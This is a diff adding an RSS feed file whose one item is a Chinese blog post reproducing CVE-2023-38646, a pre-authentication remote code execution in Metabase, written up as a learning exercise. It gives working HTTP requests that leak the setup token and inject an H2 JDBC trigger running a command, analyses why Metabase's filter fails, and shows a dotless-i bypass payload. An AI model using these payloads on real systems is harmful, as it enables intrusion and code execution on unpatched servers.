@@ -1,0 +1,139 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>JDBC on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/jdbc/</link><description>Recent content in JDBC on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 30 Jul 2023 22:39:23 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/jdbc/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2023-38646复现</title><link>https://amiaaaz.github.io/2023/07/30/cve-2023-38646/</link><pubDate>Sun, 30 Jul 2023 22:39:23 +0800</pubDate><guid>https://amiaaaz.github.io/2023/07/30/cve-2023-38646/</guid><description>&lt;p>twi上看到了这个洞 而且还是Pre-auth RCE，想赶着热乎的尝试分析一下、结果踩了个坑——官方的patch并没有在github源码中 而是直接包含在了release文件中，也是没有经验，最终独立复现以失败告终&lt;/p>
+&lt;p>下面是根据其他师傅的文章来复现，嘛 也算不亏 毕竟知识是学到了√&lt;/p>
+&lt;hr>
+&lt;h2 id="前置">前置&lt;/h2>
+&lt;p>Metabase是一个开源的Dashboard 可用来展示数据可视化的图表等，有用户系统，项目主要由Clojure编写（基于Lisp 但建立在JVM之上，可以和Java互相调用），分发出的可执行的文件是.jar文件，通过java -jar Metabase.jar启动&lt;/p>
+&lt;p>debug环境就不多说了，经典的Remote JVM Debug&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java.exe -jar -agentlib:jdwp&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">transport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>dt_socket,server&lt;span style="color:#f92672">=&lt;/span>y,suspend&lt;span style="color:#f92672">=&lt;/span>n,address&lt;span style="color:#f92672">=&lt;/span>*:5005 .&lt;span style="color:#8045ff">\l&lt;/span>ib&lt;span style="color:#8045ff">\m&lt;/span>etabase.jar
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果觉得没有Java的原生类看着别扭 可以单独添加与运行Java版本对应的src.zip到Library中&lt;/p>
+&lt;p>*有一个很蛋疼的点是Metabase项目较大 同时有很多个线程在执行，debug可能不是很流畅&lt;/p>
+&lt;h2 id="失败尝试">失败尝试&lt;/h2>
+&lt;p>从网传厚码的截图看出利用点是在一个POST JSON请求，我们先找到处理web请求的handle函数&lt;code>org.eclipse.jetty.server.Server#handle&lt;/code>，发现metabase使用的是jetty作为中间件，后续处理请求大部分代码使用Clojure（如路由匹配、鉴权等核心功能） 其中穿插调用Java代码&lt;/p>
+&lt;p>回看更新前后的diff，除去Docker tag的bug修复、为发布release的空commit以外，还剩下两个 都与数据库有关，但都是对已有issues的修复，看不出来有什么安全上的考量…… 阴谋论一下：可能关于安全的更新仅在release文件中&lt;/p>
+&lt;p>*结果还真是&lt;/p>
+&lt;h2 id="正确道路">正确道路&lt;/h2>
+&lt;h3 id="h2-jdbc-rce">H2 JDBC RCE&lt;/h3>
+&lt;p>在Metabase初始化时可以选择配置数据库连接，支持H2数据库&lt;/p>
+&lt;p>回想之前JDBC的利用技巧，我们可以利用连接语句的&lt;code>INIT&lt;/code>配置项做到rce&lt;/p>
+&lt;pre tabindex="0">&lt;code>jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &amp;#39;http://127.0.0.1:8081/poc.sql&amp;#39;
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER amiz BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS &amp;#39;//javascript\njava.lang.Runtime.getRuntime().exec(\&amp;#34;calc.exe\&amp;#34;)&amp;#39;
+&lt;/code>&lt;/pre>&lt;p>那Metabase是否可以做一样的事情呢？&lt;/p>
+&lt;p>先发送一个普通的连接数据包&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230730172155914.png" alt="image-20230730172155914">&lt;/p>
+&lt;p>是用json确定连接时的参数，我们添一条&lt;code>init&lt;/code> 并把payload放入，db选取Metabase.jar中自带的sample-database.db，虽然是在jar包中、但可以用&lt;code>zip:&lt;/code>让其自动解压&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;is_on_demand&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;is_full_sync&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;is_sample&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;cache_ttl&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;refingerprint&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;auto_run_queries&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;schedules&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{},&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;details&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;db&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;zip:./lib/metabase.jar!/sample-database.db;MODE=MSSQLServer;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;advanced-options&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ssl&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;#34;init&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec(&amp;#39;calc.exe&amp;#39;)\u000A$$&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;an-sec-research-team&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;engine&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;h2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>又因为这个连接的过程在最初项目setup时也有，用来鉴权的token在&lt;code>/api/session/properties&lt;/code>中（未授权访问，在setup结束后仍然存在），所以整体的利用过程如下&lt;/p>
+&lt;ol>
+&lt;li>请求/api/session/properties获取setup-token&lt;/li>
+&lt;/ol>
+&lt;pre tabindex="0">&lt;code>GET /api/session/properties HTTP/1.1
+Host: localhost:3000
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+&lt;/code>&lt;/pre>&lt;ol start="2">
+&lt;li>请求/api/setup/validate，利用H2 JDBC的技巧进行RCE&lt;/li>
+&lt;/ol>
+&lt;pre tabindex="0">&lt;code>POST /api/setup/validate HTTP/1.1
+Host: localhost:3000
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/json
+Content-Length: 739
+{
+&amp;#34;token&amp;#34;: &amp;#34;[setup-token]&amp;#34;,
+&amp;#34;details&amp;#34;:
+{
+&amp;#34;is_on_demand&amp;#34;: false,
+&amp;#34;is_full_sync&amp;#34;: false,
+&amp;#34;is_sample&amp;#34;: false,
+&amp;#34;cache_ttl&amp;#34;: null,
+&amp;#34;refingerprint&amp;#34;: false,
+&amp;#34;auto_run_queries&amp;#34;: true,
+&amp;#34;schedules&amp;#34;:
+{},
+&amp;#34;details&amp;#34;:
+{
+&amp;#34;db&amp;#34;: &amp;#34;zip:./lib/metabase.jar!/sample-database.db;MODE=MSSQLServer;&amp;#34;,
+&amp;#34;advanced-options&amp;#34;: false,
+&amp;#34;ssl&amp;#34;: true,
+&amp;#34;init&amp;#34;: &amp;#34;CREATE TRIGGER amiz BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS &amp;#39;//javascript\njava.lang.Runtime.getRuntime().exec(\&amp;#34;calc.exe\&amp;#34;)&amp;#39;&amp;#34;
+},
+&amp;#34;name&amp;#34;: &amp;#34;an-sec-research-team&amp;#34;,
+&amp;#34;engine&amp;#34;: &amp;#34;h2&amp;#34;
+}
+}
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230730215738593.png" alt="image-20230730215738593">&lt;/p>
+&lt;h3 id="代码分析">代码分析&lt;/h3>
+&lt;p>虽然我们是直接利用了&lt;code>init&lt;/code>，但实际上Metabase是存在过滤的，在metabase.driver.h2/connection-string-set-safe-options中有这样的代码&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230730175056274.png" alt="image-20230730175056274">&lt;/p>
+&lt;p>会将&lt;code>INIT=...&lt;/code>统统删除，那为什么我们还可以利用成功呢？&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230730211247389.png" alt="image-20230730211247389">&lt;/p>
+&lt;p>因为实际进入到判断的options只有&lt;code>db&lt;/code>里的&lt;code>MODE=MSSQLSERVER&lt;/code>，&lt;code>init&lt;/code>参数是通过json中单独的键传入&lt;/p>
+&lt;p>而全部的参数则会在之后不断merge到jdbc-spec参数中&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230730211600349.png" alt="image-20230730211600349">&lt;/p>
+&lt;p>jdbc-spec中的所有配置项是不经过安全检查的，直接就到了java.sql.DriverManager#getConnection(java.lang.String, java.util.Properties)，所以导致我们对payload不用任何的处理即可被执行&lt;/p>
+&lt;h3 id="另一种payload">另一种payload&lt;/h3>
+&lt;p>如果我们就是执意要把&lt;code>init=xxx&lt;/code>放到&lt;code>db&lt;/code>字符串里，可以怎么绕过呢？p牛的这篇文章-&amp;gt; &lt;a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性&lt;/a>提到拉丁字母&lt;code>&amp;quot;ı&amp;quot;.toUpperCase() == 'I'&lt;/code>，但connection-string-set-safe-options是使用&lt;code>lower-case-en&lt;/code>对&lt;code>db&lt;/code>字符串的参数转小写后匹配，到h2真正执行时会用&lt;code>readSettingsFromURL&lt;/code>函数进行处理，这里用的时&lt;code>toUpperEnglish&lt;/code>；我们利用这个大小写差异来构造paylaod&lt;/p>
+&lt;pre tabindex="0">&lt;code>{
+&amp;#34;token&amp;#34;: &amp;#34;[setup-token]&amp;#34;,
+&amp;#34;details&amp;#34;:
+{
+&amp;#34;is_on_demand&amp;#34;: false,
+&amp;#34;is_full_sync&amp;#34;: false,
+&amp;#34;is_sample&amp;#34;: false,
+&amp;#34;cache_ttl&amp;#34;: null,
+&amp;#34;refingerprint&amp;#34;: false,
+&amp;#34;auto_run_queries&amp;#34;: true,
+&amp;#34;schedules&amp;#34;:
+{},
+&amp;#34;details&amp;#34;:
+{
+&amp;#34;db&amp;#34;: &amp;#34;zip:./lib/metabase.jar!/sample-database.db;MODE=MSSQLServer;ınit=CREATE TRIGGER amiz BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&amp;#39;calc.exe&amp;#39;)\n$$&amp;#34;,
+&amp;#34;advanced-options&amp;#34;: false,
+&amp;#34;ssl&amp;#34;: true
+},
+&amp;#34;name&amp;#34;: &amp;#34;an-sec-research-team&amp;#34;,
+&amp;#34;engine&amp;#34;: &amp;#34;h2&amp;#34;
+}
+}
+&lt;/code>&lt;/pre>&lt;h2 id="经验教训">经验教训&lt;/h2>
+&lt;ol>
+&lt;li>有时候开源项目的安全更新并不在commit里…… 也许鸡贼的直接在release中进行patch&lt;/li>
+&lt;li>漏洞是新的，但核心往往是已有的trick的奇妙组合，基本功还是要很扎实才行&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
+&lt;/h4>
+&lt;/summary>
+&lt;p>&lt;a href="https://wx.zsxq.com/dweb2/index/topic_detail/185285425815252">从JDBC到h2 database任意命令执行&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://rce.moe/2023/07/28/Metabase-CVE-2023-38646/">Metabase 远程代码执行漏洞分析 一种补丁绕过方法 CVE-2023-38646&lt;/a>&lt;/p>
+&lt;/details></description></item></channel></rss>
